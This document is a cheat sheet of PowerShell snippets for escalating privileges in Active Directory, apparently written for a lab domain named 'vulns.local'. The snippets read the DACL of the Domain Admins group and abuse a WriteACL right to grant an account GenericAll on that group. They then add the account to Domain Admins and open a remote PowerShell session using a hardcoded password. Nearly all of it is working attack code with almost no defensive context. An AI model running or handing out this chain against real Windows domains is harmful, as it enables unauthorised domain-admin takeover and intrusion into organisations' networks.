## Reading DACL of an AD group object
```
# Can Use Powerview: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
# Or:
$ADSI = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=vulns,DC=local"
$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
# Or:
$ldapConnString = "LDAP://CN=Domain Admins,CN=Users,DC=vulns,DC=local"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$domainDirEntry.get_ObjectSecurity().Access
```
## If the user context you're running has "WriteACL" permissions to domain admins, add "GenericAll" permissions to Domain Admins
```
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Domain Admins,CN=Users,DC=vulns,DC=local"
$username = "username"
$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
$IdentityReference = (New-Object System.Security.Principal.NTAccount("vulns.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$secOptions = $domainDirEntry.get_Options()
$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$domainDirEntry.RefreshCache()
$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```

## If Domain Admins has "GenericAll" permissions, add a user account to the "Domain Admins" group
```
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Domain Admins,CN=Users,DC=vulns,DC=local"
$username = "username"
$password = "Password!@12"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
$user = New-Object System.Security.Principal.NTAccount("vulns.local\$username")
$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
$b=New-Object byte[] $sid.BinaryLength
$sid.GetBinaryForm($b,0)
$hexSID=[BitConverter]::ToString($b).Replace('-','')
$domainDirEntry.Add("LDAP://<SID=$hexSID>")
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```

## Establishing remote PowerShell Session
```
$password = ConvertTo-SecureString "Password!@12" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ("vulns.local\chrisd", $password)
Enter-PSSession -ComputerName WIN-4JFNT305Q5J.vulns.local -Credential $creds -Authentication Negotiate
```
